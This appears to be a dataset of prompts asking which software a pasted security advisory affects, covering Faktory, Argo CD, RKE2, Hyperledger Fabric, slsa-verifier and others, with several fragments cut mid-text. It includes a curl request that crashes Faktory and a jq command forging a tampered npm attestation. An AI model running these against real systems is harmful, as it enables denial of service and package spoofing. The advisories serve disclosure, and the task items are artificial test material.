Please identify the software name affected by it. Input: ### Summary\nFaktory web dashboard can suffer from denial of service by a crafted malicious url query param `days`.\n\n### Details\nThe vulnerability is related to how the backend reads the `days` URL query parameter in the Faktory web dashboard. The value is used directly without any checks to create a string slice. If a very large value is provided, the backend server ends up using a significant amount of memory and causing it to crash.\n\n### PoC\nTo reproduce this vulnerability, please follow these steps:\n\nStart the Faktory Docker and limit memory usage to 512 megabytes for better demonstration:\n```\n$ docker run --rm -it -m 512m \\\n  -p 127.0.0.1:7419:7419 \\\n  -p 127.0.0.1:7420:7420 \\\n  contribsys/faktory:latest\n``` \n\nSend the following request. The Faktory server will exit after a few seconds due to out of memory:\n\n```\n$ curl 'http://localhost:7420/?days=922337'\n```\n\n### Impact\n**Server Availability**: The vulnerability can crash the Faktory server, affecting its availability.\n**Denial of Service Risk**: Given that the Faktory web dashboard does not require authorization, any entity with internet access to the dashboard could potentially exploit this vulnerability. This unchecked access opens up the potential for a Denial of Service (DoS) attack, which could disrupt service availability without any conditional barriers to the attacker. \n.

Please identify the software name affected by it. Input: ### Impact\nAll versions of ArgoCD starting from v2.4 have a bug where the ArgoCD repo-server component is vulnerable to a Denial-of-Service attack vector. Specifically, the said component extracts a user-controlled tar.gz file without validating the size of its inner files. As a result, a malicious, low-privileged user can send a malicious tar.gz file that exploits this vulnerability to the repo-server, thereby harming the system's functionality and availability. Additionally, the repo-server is susceptible to another vulnerability due to the fact that it does not check the extracted file permissions before attempting to delete them. Consequently, an attacker can craft a malicious tar.gz archive in a way that prevents the deletion of its inner files when the manifest generation process is completed.\n\n\n### Patches\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.15\n* v2.7.14\n* v2.8.3\n\n### Workarounds\nThe only way to completely resolve the issue is to upgrade.\n\n#### Mitigations\nConfigure RBAC (Role-Based Access Control) and provide access for configuring applications only to a limited number of administrators. These administrators should utilize trusted and verified Helm charts.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\nThis vulnerability was found & reported by GE Vernova \u2013 Amit Laish.\n\nThe Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue\n.

Input: ### Impact\n\nAn issue was found in RKE2 where an attacker with network access to RKE2 servers' supervisor port (TCP 9345) can force the TLS server to add entries to the certificate's Subject Alternative Name (SAN) list, through a stuffing attack, until the certificate grows so large that it exceeds the maximum size allowed by TLS client implementations. OpenSSL for example will raise an `excessive message size` error when this occurs. No authentication is necessary to perform this attack, only the ability to perform a TLS handshake against the supervisor port (TCP 9345).\n\nAffected servers will continue to operate, but clients (server or agent nodes) will fail to establish new connections when joining or rejoining the cluster, thus leading to a denial of service (DoS) attack.\n\n### Remediation\n\nUpgrade to a fixed release:\n- v1.28.1+rke2r1\n- v1.27.5+rke2r1\n- v1.26.8+rke2r1\n- v1.25.13+rke2r1\n- 1.24.17+rke2r1\n\nIf you are using RKE2 1.27 or earlier, you must also add the parameter `tls-san-security: true` to the RKE2 configuration to enable enhanced security for the supervisor's TLS SAN list. This option defaults to `true` starting with RKE2 1.28.\n\nNote that this flag changes the behavior of RKE2's supervisor listener. You should ensure that you configure `node-external-ip` on servers that will be connected to via an external IP, and add `tls-san` entries for any load-balancers or VIP addresses that will be associated with the supervisor port. External IPs and load-balancer/VIP addresses will no longer be added to the supervisor certificate's SAN list unless explicitly configured.\n\n### Mitigation\n\nIf you cannot upgrade to a fixed release, the certificate can be \"frozen\" by running the following command against the cluster:\n\n```shell\nkubectl annotate secret -n kube-system rke2-serving listener.cattle.io/static=true\n```\n\n**\u26a0\ufe0f IMPORTANT CAUTION:** Note that this mitigation will prevent the certificate from adding new SAN entries when servers join the cluster, and automatically renewing itself when it is about to expire. If you do this, you should delete the annotation when adding new servers to the cluster, or when the certificate is within 90 days of expiring, so that it can be updated. Once that is done, you can freeze it again.\n\nAffected certificates can be reset by performing the following steps:\n* Run `kubectl delete secret -n kube-system rke2-serving`\n* Delete `/var/lib/rancher/rke2/server/tls/dynamic-cert.json` from all servers, and restart the `rke2-server` service.\n\n### Background\n\nThe RKE2 supervisor listens on port TCP 9345 and uses the `rancher/dynamiclistener` library to dynamically generate TLS certificates that contain TLS Subject Alternative Names (SAN) for any host name or IP address requested by a client. This is done to allow servers and external load-balancers to be added to the cluster without the administrator having to explicitly know and configure in advance a fixed list of endpoints that the supervisor may be hosted at.\n\nThe library allows the embedding application to configure a callback that is used to filter addresses requested by clients; but this was not previously implemented in RKE2.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rke2/security/policy) for security related inquiries.\n- Open an issue in the [RKE2](https://github.com/rancher/rke2/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)..

This is done to allow servers and external load-balancers to be added to the cluster without the administrator having to explicitly know and configure in advance a fixed list of endpoints that the supervisor may be hosted at.\n\nThe library allows the embedding application to configure a callback that is used to filter addresses requested by clients; but this was not previously implemented in K3s.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [K3s Security team](https://github.com/k3s-io/k3s/security/policy) for security related inquiries.\n- Open an issue in the [K3s](https://github.com/k3s-io/k3s/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-k3s/support-matrix/all-supported-versions) and [product support lifecycle](https://www.suse.com/lifecycle/#k3s)..

If a participant generates a Paillier modulus `N` containing small factors (less than `2^100`) they can interact with other participants in the signing protocol to steal their secret key shares in as little as sixteen signing attempts. The master key can then be reconstructed from these shares.\n\n### Patches\n\nThe implementation of GG18 in tss-lib did not prove that `N` is biprime or that it doesn't contain small factors. The fixed implementation adds the following proofs from the CGGMP21 threshold ECDSA protocol to the key generation:\n\n- Paillier-Blum Modulus (`N` is the product of two primes)\n- No Small Factor (both factors of `N` are greater than `2^256`)\n\nThese proofs apply to both the Paillier encryption modulus `N`, and the modulus `NTilde` used in MTA proofs.\n\nTo address the issue in the resharing protocol, an additional round has been added to the end so that participants can confirm that they received valid proofs.\n\n### References\n\n- [GG18](https://eprint.iacr.org/2019/114)\n- [CGGMP21](https://eprint.iacr.org/2021/060).

Input: ### Impact\nIn Argo CD versions prior to 2.3 (starting at least in v0.1.0, but likely in any version using Helm before 2.3), using a specifically-crafted Helm file could reference external Helm charts handled by the same repo-server to leak values, or files from the referenced Helm Chart. This was possible because Helm paths were predictable. \n\nThe vulnerability worked by adding a Helm chart that referenced Helm resources from predictable paths. Because the paths of Helm charts were predictable and available on an instance of repo-server, it was possible to reference and then render the values and resources from other existing Helm charts regardless of permissions. While generally, secrets are not stored in these files, it was nevertheless possible to reference any values from these charts. \n\n### Patches\nThis issue was fixed in Argo CD 2.3 and subsequent versions by randomizing Helm paths.\n\n### Workarounds\nUser's still using Argo CD 2.3 or below are advised to update to a [supported version](https://argo-cd.readthedocs.io/en/stable/operator-manual/installation/#supported-versions). If this is not possible, disabling Helm chart rendering, or using an additional repo-server for each Helm chart would prevent possible exploitation.  \n\n### References\nhttps://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)\n.

Input: ## Amulet Security Advisory for CometBFT: ASA-2023-002\n\n**Component**: CometBFT\n**Criticality:** Low\n**Affected versions:** All\n**Affected users:** Validators, Chain Builders + Maintainers\n\n# Summary\n\nA default configuration in CometBFT has been found to be large for common use cases, and may affect block times and consensus participation when fully utilized by chain participants. It is advised that chains consider their specific needs for their use case when setting the `BlockParams.MaxBytes` consensus parameter. Chains are encouraged to evaluate the impact of having proposed blocks with the maximum allowed block size, especially on bandwidth usage and block latency. Additionally, the `timeout_propose` parameter should be computed using the maximum allowed block size as a reference. This issue does not represent an actively exploitable vulnerability that would result in a direct loss of funds, however it may have a slight impact on block latency depending on a network\u2019s topography.\n\nWhen setting a large `BlockParams.MaxBytes`, there are two main implications:\n* Increased bandwidth to propagate a block\n* Increased latency to propagate a block\n\nWhen combined, this may result in less round participation, and in some cases additional rounds may be required to meet the consensus threshold, which could lead to timeouts depending on the topography of a network and environmental factors. These factors can include the number of validators on a network, geographic distribution, network connectivity (including latency, bandwidth, and reachability), the functionality of the modules implementing the logic for a transaction in your chain, etc.\u00a0 The cost to propagate a 21MB block, the default value for `BlockParams.MaxBytes`, will be far higher than the cost of propagating a smaller 1MB block.\u00a0CometBFT recommends tuning this parameter to a smaller limit if full initial-round participation is an important quality for your chain.\n\n# Considerations\nCometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. A high-performing validator may find it necessary to experiment with tuning local configuration, optimizing network and compute resources, and implementing controls to inhibit spam.\n\n\n# Next Steps for Chains and Validators\n\nTo increase awareness of the potential impacts of this default parameter, the CometBFT team has updated the documentation (https://github.com/cometbft/cometbft/pull/1405, [v0.34.x](https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes), [v0.37.x](https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes), [v0.38.x](https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes)) for builders and maintainers of chain applications. Additionally, it is recommended that:\n\n\n* Chain ecosystems and their maintainers set a `BlockParams.MaxBytes` configuration appropriate for their use case at the application level; in some cases, fine-tuning `BlockParams` may require a network upgrade.\n* Chain ecosystems and their maintainers evaluate how gas is used and required on their chain, including gas and fee parameters, no-fee or fee-exempt message policies, and ensure that any custom modules integrate with the gas and fee frameworks. This is especially important for chains that may have implemented custom modules or functionality to allow IBC messages to bypass fees.\n* Chain ecosystems and their maintainers audit all of their currently-set parameters and configurations to ensure that they are appropriate for their use case.\n\n* All validators develop and implement anti-spam measures on their nodes. Amulet encourages validators to form working groups to collaborate on spam prevention and on tooling that can be implemented by node operators across the Interchain.\n* All validators consider developing and implementing tooling that would allow them to sample incoming transactions to enable them to fine-tune the level of service they would like to provide to be resilient in slowdown scenarios. Amulet also encourages validators to collaborate on tooling that can be implemented by node operators across the Interchain.\n\n\nThe CometBFT team has also revisited all the checks performed by the consensus protocol regarding proposed blocks. This investigation has confirmed that proposed blocks with size exceeding the `BlockParams.MaxBytes` limit established by the application are not accepted by nodes. The team notwithstanding has decided to introduce additional sanity checks for the size of proposed blocks (https://github.com/cometbft/cometbft/pull/1408), allowing for an early identification and rejection of invalid or oversized blocks. These code changes will be included in the _next_ release of each branch of CometBFT.\n\nAs more chains adopt the Interchain Stack for new and cutting-edge use cases, the CometBFT team recommends that all chains regularly evaluate their parameters and configurations to ensure they meet the needs of their ecosystem as their networks mature.\u00a0\n\n\nFor more information about CometBFT, see [https://docs.cometbft.com](https://docs.cometbft.com/). \n\n\n\n\n\nThis issue was raised by Notional labs, who reported it via the vulnerability disclosure channel at [security@interchain.io](mailto:security@interchain.io) on Friday, September 23, 2023. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see [https://hackerone.com/cosmos](https://hackerone.com/cosmos).\u00a0\n\n\n*****\n\n \nNote from Amulet on the Security Advisory Process:\n\n\nIn the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack..

Input: ### Summary\nA vulnerability was fond in Knative Serving that could allow an attacker to crash the Knative Serving autoscaler resulting in a denial of service. The attacker would need to have compromised one pod in the Knative Serving deployment, and with that position they could launch the attack against the autoscaler. \nWhen the autoscaler scrapes the metrics of pods, it sends a request to the `/metrics` endpoint of each pod and reads the response. The attacker would need to detect the request from the autoscaler to the `/metrics` endpoint of the pod they had compromised and send a malicious response back to the autoscaler. At this point, the autoscaler would crash. The root cause of the vulnerability was a memory exhaustion issue in the autoscaler that the attacker could trigger with the malicious reponse.\n\nThe vulnerability would allow a privilege escalation by the attacker from controlling one point to having negative impact on the entire Knative Serving deployment.\n\n### Impact\nAll users are vulnerable to this; Users that have not had any of their pods compromised are not at risk of this vulnerability.  \n\n### Mitigation\nThe vulnerability has been patched in v1.10.5, v1.11.3 and v1.12.0\n\n### Credits\nThe vulnerability was reported by Ada Logics during an ongoing security audit of Knative involving Ada Logics, the Knative maintainers, OSTIF and CNCF..

Input: ### Summary\n\n`slsa-verifier<=2.4.0` does not correctly verify npm's [publish](https://github.com/npm/attestation/tree/main/specs/publish/v0.1) attestations signature.\n\n### Proof of concept\n\nSteps to reproduce:\n1. `curl -Sso attestations.json $(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.attestations.url')`\n2. `curl -Sso supreme-goggles.tgz \"$(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.tarball')\"`\n3. In `attestations.json`, take the value addressed by the `jq` selector `.attestations[0].bundle.dsseEnvelope.payload`, base64decode it, tamper with it, base64encode that, and replace the original value with that. Save the file as `attestations_tampered.json`.\n   Here is an example command to replace the package name with `@attacker/malicious`:\n   `jq -r \".attestations[0].bundle.dsseEnvelope.payload = \\\"$(jq -r '.attestations[0].bundle.dsseEnvelope.payload | @base64d' < attestations.json | jq '.subject[0].name = \"pkg:npm/%40attacker/malicious\"' | base64 -w0)\\\"\" < attestations.json > attestations_tampered.json`\n5. `SLSA_VERIFIER_EXPERIMENTAL=1 slsa-verifier verify-npm-package supreme-goggles.tgz --attestations-path attestations_tampered.json --builder-id \"https://github.com/actions/runner/github-hosted\" --package-name \"@trishankatdatadog/supreme-goggles\" --package-version 1.0.5 --source-uri github.com/trishankatdatadog/supreme-goggles`\n6. The result is that `slsa-verifier` fails to detect this tampering of the publish attestation (unlike with the provenance attestation) and returns `PASSED`.\n\n### Impact\n\nAn attacker who controls what packages and attestations are shown to a user _can_ associate a package with an arbitrary name and version that do _not_ match what the user expects from the publish attestation. Furthermore, the package digest in the publish attestation need _not_ match its counterpart in the provenance attestation. However, the attacker _cannot_ associate the given package with an arbitrary source and builder that the user does not expect from the provenance attestation. Thus, the attacker could, for example, convince package managers to install authentic but older versions of packages that contain known, exploitable vulnerabilities.\n\nSeverity is considered low because 1) it does not invalidate the provenance and 2) support for npm is currently experimental.\n\n### Patches\n\nFixed by PR [#705](https://github.com/slsa-framework/slsa-verifier/pull/705) and released in versions `>=2.4.1`.\n\n### Workarounds\n\nThere is no easy way for users to fix or remediate this vulnerability without upgrading, short of verifying npm's publish attestations themselves, _and_ cross-verifying it against GHA's provenance attestations.\n\n### References\n\n* [Original OpenSSF Slack thread](https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179)\n.

The issue would require the attacker to compromise the registry that the Kyverno fetch their images from.

As such, the attacker would need to know which images the Kyverno user consumes and know of one of multiple exploitable vulnerabilities in previous digests of the images.

An attacker who controls a remote registry can return a high number of attestations and/or signatures to Cosign and cause Cosign to enter a long loop resulting in an endless data attack. The root cause is that Cosign loops through all attestations fetched from the remote registry in `pkg/cosign.FetchAttestations`.\n\nThe attacker needs to compromise the registry or make a request to a registry they control. When doing so, the attacker must return a high number of attestations in the response to Cosign. The result will be that the attacker can cause Cosign to go into a long or infinite loop that will prevent other users from verifying their data. In Kyvernos case, an attacker whose privileges are limited to making requests to the cluster can make a request with an image reference to their own registry, trigger the infinite loop and deny other users from completing their admission requests. Alternatively, the attacker can obtain control of the registry used by an organization and return a high number of attestations instead the expected number of attestations.\n\nThe vulnerable loop in Cosign starts on line 154 below:\nhttps://github.com/sigstore/cosign/blob/004443228442850fb28f248fd59765afad99b6df/pkg/cosign/fetch.go#L135-L196\n\nThe `l` slice is controllable by an attacker who controls the remote registry.\n\nMany cloud-native projects consider the remote registry to be untrusted, including Crossplane, Notary and Kyverno.

The gadget works by constructing a fixed lookup table containing all valid entries, partitioning the input and checking that all parts are inside the lookup table. The range checker gadget did not take into account that the highest partition may be less than the width limit, allowing the inputs to be up to 16 bits wider than checked.\n\nRange checking gadget is extensively used in field emulation. Users using any dependant gadget (ECDSA verification, proof recursion etc.) is impacted.\n\nWe consider the impact of the vulnerability being low as the number of attacker-modifiable bits is significantly smaller compared to the bit-width of scalar field modulus and it won't be possible to construct inputs which would allow to overflow the scalar field.\n\n### Patches\n\nThe issue has been patched in the stable branch of gnark. \n\nDue to low severity of the issue no emergency release will be issued and we follow the existing release plan. Versions v0.9.2 and higher are patched.\n\n### Workarounds\n\nWe consider the issue very hard to exploit and do not recommend manual remediation.

Please identify the software name affected by it. Input: # Short summary\n\nCombining two molecules to one another, called \"cross-linking\" results in a molecule with a chemical formula that is composed of all atoms of the original two molecules. \n\nIn Fabric, one can take a block of transactions and cross-link the transactions in a way that alters the way the peers parse the transactions. If a first peer receives a block `B` and a second peer receives a block identical to `B` but with the transactions being cross-linked, the second peer will parse transactions in a different way and thus its world state will deviate from the first peer. \n\nOrderers or peers cannot detect that a block has its transactions cross-linked, because there is a vulnerability in the way Fabric hashes the transactions of blocks. It simply and naively concatenates them, which is insecure and lets an adversary craft a \"cross-linked block\" (block with cross-linked transactions) which alters the way peers process transactions. \nFor example, it is possible to select a transaction and manipulate a peer to completely avoid processing it, without changing the computed hash of the block.\n\nAdditional validations have been added in v2.2.14 and v2.5.5 to detect potential cross-linking issues before processing blocks.\n\n## Impact\nIn V1 and V2, we only have a crash fault tolerant orderer and as such, the security model Fabric operates in is that the orderer is honest,\nbut peers may be malicious. As such, a peer that replicates a block from a malicious peer can have a state fork.\n\nIn V3 which we did not a release a GA yet (only a preview), we have a byzantine fault tolerant orderering service, so the security model that Fabric operates in such a case includes malicious orderers. If the orderer is malicious, it can cause state forks for peers, and can infect non-malicious orderers with cross-linked blocks.\n\n# Long summary\n\nIn order to create a signature on a big chunk of data  such as a block, the data needs to be \"compressed\" first to the input size of the signature algorithm.\n\nIn Fabric's case, we use a hash function which compressed a Fabric block from arbitrary size to a 32 byte string.\n\nIn order to understand the problem we need to be more specific: The block structure has three parts to it: (1) Header, (2) Transactions, and (3) Metadata.\n\nWhen hashing the block, the header and metadata are stitched together and then hashed, and this hash of the header and the metadata is what signed (it's a simplification but let's not get into details)\n\nHowever, the transactions of the block are not part of the above hash. Instead, the header contains a hash, called the \"Data hash\" and despite the fact that in the comments it is said: \"// The hash of the BlockData, by MerkleTree\", actually it is far from being the case, and that is where our problem lies.\n\nThe problem is that the way the transactions are hashed gives an attacker some freedom in manipulating the data. \n\nTo create the Data Hash, the transactions in the block are concatenated to one another, creating a big long byte array and then this big long byte array is hashed, and this is essentially the Data Hash.\n\nThe transactions in the block are a list of raw byte arrays, and when they are concatenated they look like this:\n\n`|$$$$$$$$$$$$|*************|@@@@@@@@@@@@|%%%%%%%%%|`  (The vertical lines \" | \" represent how transactions are separated in a block.)\n\nWhen the transactions are concatenated in order to be hashed, the payload that is hashed is: \n`$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%`\n\nAn adversary can't change the bytes of the concatenation, however what it can do, is to modify how transactions are encoded in the block:\n\nFor example, consider an adversary wants to manipulate a peer to skip the second transaction (******).\n\nIt can then create a block with the transactions as follows:\n\n`|$$$$$$$$$$$$*************|@@@@@@@@@@@@|%%%%%%%%%| `\n\nNotice that a block with the above transactions has the same concatenation of bytes as the original block, but the block has one less transaction - the first transaction is a concatenation of the first and second transactions in the original block.\n\nWhen the peer receives this block, it looks at the first transaction and when it parses it, it completely ignores the ***** bytes, (we will see why soon), and so, an adversary can create a block with the same hash but different transactions and this would create a fork in the network.\n \nI made a small PoC where I created a block with 2 transactions (by invoking two chaincodes at the same time) with a Raft orderer:\n\n```\n    [e][OrdererOrg.orderer] 2023-10-14 23:07:34.076 CEST 0079 INFO [orderer.consensus.etcdraft] propose -> Created block [10] with 2 transactions, there are 0 blocks in flight channel=testchannel node=1\n```\n\nBut right after creating the block, I just modified only its transaction content (without modifying the block hash) and then the peers only detect a single transaction inside that block:\n \n```\n    [e][Org2.peer0] 2023-10-14 23:07:34.079 CEST 0099 INFO [kvledger] commit -> [testchannel] Committed block [10] with 1 transaction(s) in 0ms (state_validation=0ms block_and_pvtdata_commit=0ms state_commit=0ms) commitHash=[c5ecca818da9319af2f276dd01cd1337938f20c3535dd23f95a33933a114fe84]\n```\n\nThe important takeaway from this experiment is that the peer does not detect any tempering was done to the block. If an attacker performs this attack, the network can be forked silently and no one will notice the network was forked until it's too late.\n\n \n\n# Patches\nHere is the patch I propose (the explanation is further below): \n\n```\ndiff --git a/internal/peer/gossip/mcs.go b/internal/peer/gossip/mcs.go\nindex b46df8b6a..9c3b5c8fd 100644\n--- a/internal/peer/gossip/mcs.go\n+++ b/internal/peer/gossip/mcs.go\n@@ -150,6 +150,10 @@ func (s *MSPMessageCryptoService) VerifyBlock(chainID common.ChannelID, seqNum u\n \t\treturn fmt.Errorf(\"Block with id [%d] on channel [%s] does not have metadata.

earlier, \n\nbut also ensure that if the transactions in the block are encoded into bytes, they re-create the exact split in the original block: `|$$$$$$$$$$$$|***********|@@@@@@@@@|%%%%%%%%%%%|`\n\nMore specifically, each transaction in the block is parsed and then re-encoded to bytes, and we check that the original encoding of a transaction is as the second encoding after parsing the original bytes of the transaction.\n\nThis fix keeps the legacy way of hashing transactions to create the block data hash, but also aims to check if some manipulation was done.\n\n \nTo understand why the fix works, we need to understand how protobuf, the wire protocol that Fabric uses to encode transactions (and almost anything it sends over the wire or writes to disk) encodes a transaction.\n\nA transaction is a protobuf message with two fields of bytes: (1) Payload and (2) Signature.\n\nWhen encoding a field of bytes, protobuf first writes a tag for the field (a byte) and then writes the length of the field in variable-length encoding, and then the bytes themselves.\n\nFor example, to encode a transaction, protobuf writes 10 (the tag for payload), then two bytes for the length of the payload, then the payload, and then 18, the tag for the signature, and then a single byte for the length of the signature, and finally the signature.\n\nNow, we can understand a proof sketch of why my solution works:\n\nAssume in contradiction that an adversary takes a block of transactions and changes the split of the concatenation in a way that changes the transactions for a peer:\n\nFrom `|$$$$$$$$$$$$|************|@@@@@@@@@@@|...|%%%%%%%|` to (for example): From `|$$$$$$$$$$$$************|@@@@@@@@@@@|...|%%%%%%%|` \n\nSince this split is not identical to the original split, there exists at least one transaction index of different size between the two splits. Let's look at the first transaction that is of different size.\n\nFor example, for the split:\n\n`|$$$$$$$$$$$$|************|@@@@@@@@@@@|...|%%%%%%%|`  we have two options:\n\n1.  The first transaction of different size is smaller in the new split:  `|$$$$$$$$$$$$|*****|*******|@@@@@@@@@@@|...|%%%%%%%|`  In such a case, it must contain both a payload and a signature, so it needs two fields (we can say we will return an error if one of the two is missing). If the protobuf parser detects it lacks bytes to parse a payload, it will fail with an error. Else, it has enough bytes to parse the payload, and then the signature is parsed. If the signature field is too short then we also error similarly.\n\n2. The first transaction of different size is bigger in the new split: `|$$$$$$$$$$$$|************@@@@|@@@@@@@|...|%%%%%%%|` \nIn that case, once this transaction is parsed, the extra bytes are skipped, so encoding the transaction to bytes yields a shorter byte array, and we detect a tempering.\n\n.

Please identify the software name affected by it. Input: ## Overview\n\nWe have identified and addressed a security issue in the Nuclei project that affected users utilizing Nuclei as **Go code (SDK)** running **custom templates**. This issue did not affect CLI users. The problem was related to sanitization issues with payloads loading in `sandbox` mode.\n\n## Details\n\nIn the previous versions, there was a potential risk with payloads loading in sandbox mode. The issue occurred due to relative paths not being converted to absolute paths before doing the check for `sandbox` flag allowing arbitrary files to be read on the filesystem in certain cases when using Nuclei from `Go` SDK implementation. \n\nThis issue has been fixed in the latest release, v2.9.9. We have also enabled sandbox by default for filesystem loading. This can be optionally disabled if required.\n\nThe `-sandbox` option has been **deprecated** and is now divided into two new options: `-lfa` (allow local file access) which is disabled by default and `-lna` (restrict local network access) which can be optionally disabled by user. The `-lfa` allows file (payload) access anywhere on the system (disabling sandbox effectively), and `-lna` blocks connections to the local/private network.\n\n## Affected Versions\n\nThis issue affected all versions of Nuclei prior to v2.9.9.\n\n## Patches\n\nWe recommend all users upgrade to the latest version, [v2.9.9](https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.9), which includes the security fix.\n\n### References\n\n- [patch](https://github.com/projectdiscovery/nuclei/pull/3927)\n- [releases](https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.9)\n\n## Acknowledgments\n\nWe would like to thank **keomutchoiboi** who reported this issue to us via our security email, [security@projectdiscovery.io](mailto:security@projectdiscovery.io).

Please identify the software name affected by it. Input: ### Summary\nIn go-libp2p, by using signed peer records a malicious actor can store an arbitrary amount of data in a remote node\u2019s memory. This memory does not get garbage collected and so the victim can run out of memory and crash.\n\nIt is feasible to do this at scale. An attacker would have to transfer ~1/2 as much memory it wants to occupy (2x amplification factor).\n\nThe attacker can perform this attack over time as the target node\u2019s memory will not be garbage collected.\n\nThis can occur because when a signed peer record is received, only the signature validity check is performed but the sender signature is not checked. Signed peer records from randomly generated peers can be sent by a malicious actor. A target node will accept the peer record as long as the signature is valid, and then stored in the peer store.\n\nThere is cleanup logic in the peer store that cleans up data when a peer disconnects, but this cleanup is never triggered for the fake peer (from which signed peer records were accepted) because it was never \u201cconnected\u201d.\n\n### Impact\nIf users of go-libp2p in production are not monitoring memory consumption over time, it could be a silent attack i.e. the attacker could bring down nodes over a period of time (how long depends on the node resources i.e. a go-libp2p node on a virtual server with 4 gb of memory takes about 90 sec to bring down; on a larger server, it might take a bit longer.)\n\n### Patches\nUpdate your go-libp2p dependency to the latest release, v0.30.0 at the time of writing.\n\nIf you'd like to stay on the 0.27.x release, we strongly recommend users to update to go-libp2p [0.27.7](https://github.com/libp2p/go-libp2p/releases/tag/v0.27.7).

Please identify the software name affected by it. Input: ### Impact\n\nBlst versions v0.3.0 through 0.3.10 failed to perform a signature group-check if the call to `SigValidate` in the Go bindings was complemented with a check for infinity. Formally speaking, infinity, or the identity element of the elliptic curve group, is a member of the group, and the group-check should allow it. An initial review of blst users on GitHub did not uncover any use of this function with the complementary infinity check. This optional check was added as a convenience feature because despite infinity being a legitimate member of the group, individual signatures should never be infinite (as it is equivalent to having zero for the secret key), and observing one should raise a flag. \n\n### Description\n\nThe vulnerable function is declared as `SigValidate(sigInfcheck bool) bool` and if called with `sigInfcheck` argument set to `true`, the group-check was omitted. The group-check is required to be performed on untrusted input, because the pairing, the corner-stone operation of the signature scheme, is defined only on points that are members of a specific cyclic group, which is a subset of all the possible points on elliptic curves in question. Submitting an untrusted point outside the group opens up the possibility of accepting an alternative signature for a chosen message.\n\nIt should be noted that the SigValidate call is not the only way to perform the group-checks. There are optional checks integrated into various other verification methods, such as `Verify`, `AggregateVerify`, etc., as well as signature aggregation methods, such as `PairingAggregate*`. The reason why there are multiple options is that the group-check is a relatively expensive operation, and application developers are arguably entitled the freedom to choose when it's performed.\n\n### Patches\n\nThis issue has been resolved in the v0.3.11 release and users are advised to update if their application is affected or alternatively omit the complementary infinity check.\n\n### Credits\n\nA special thanks to Yunjong Jeong (@blukat29) for the discovery and disclosure of this vulnerability.\n.

It's recommended to apply the patch and rotate the GitHub token used for github status notifications.  Given that this would output github tokens to a log system, the risk is slightly higher than a \"low\" since token exposure could grant elevated access to repositories outside of control.

Input: ### Impact\nAn internal modification to the way struct `PeerState` is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:\n\n1. Via logs\n    * Setting the `consensus` logging module to \"debug\" level (should not happen in production), and\n    * Setting the log output format to JSON\n2. Via RPC `dump_consensus_state` \n\nCase 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.\n\nIn case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.\n\nThe theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one `PeerState` struct. If `dump_consensus_state` is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different `PeerState` structs) and the chain will progress again. Then, the same process can be repeated.\n\nAs the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first `PeerState` struct will deadlock, and not the others (RPC `dump_consensus_state` accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that \"for\" loop to never be reached).\n\nThis regression was introduced in versions `v0.34.28` and `v0.37.1`, and will be fixed in `v0.34.29` and `v0.37.2`.\n\n### Patches\nThe PR containing the fix is [here](https://github.com/cometbft/cometbft/pull/865), and the corresponding issue is [here](https://github.com/cometbft/cometbft/pull/863)\n\n### Workarounds\nFor case 1 (hitting the deadlock via logs)\n* either don't set the log output to \"json\", leave at \"plain\",\n* or don't set the consensus logging module to \"debug\", leave it at \"info\" or higher.\n\nFor case 2 (hitting the deadlock via RPC `dump_consensus_state`)\n* do not expose `dump_consensus_state` RPC endpoint to the public internet (e.g., via rules in your nginx setup)\n\n### References\n\n* [Issue](https://github.com/cometbft/cometbft/pull/863) that introduced the deadlock\n* [Issue](https://github.com/cometbft/cometbft/pull/524) reporting the bug via logs\n.

